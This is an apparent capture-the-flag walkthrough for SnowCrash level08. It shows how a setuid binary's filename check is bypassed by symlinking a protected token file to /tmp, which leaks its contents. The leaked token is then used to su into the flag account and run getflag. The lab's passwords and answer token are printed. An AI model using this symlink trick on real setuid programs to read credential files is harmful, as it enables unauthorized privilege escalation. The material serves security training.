# Level08

## Hint

Weird we get different errors depending on the name of the file.

## Answer

Let's check our current directory:
```
level08@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

We have an executable file, let's run it first !
```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

So we need a file to read, let's try to read the `token` file:
```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Not that easy huh ? Let's try to read the `.bash_logout` file instead:
```
level08@SnowCrash:~$ ./level08 .bash_logout
level08: Unable to open .bash_logout: Permission denied
```

We have differents errors depending on the name of the file. However we cannot move nor copy the file `token` because we don't have reading permissions on it. In that case let's try a symbolic link *(while naming the file something else than `token`)*: 
```
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

Remember since this is a token we'll have to login to the user `flag08` first, let's login:

``` 
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```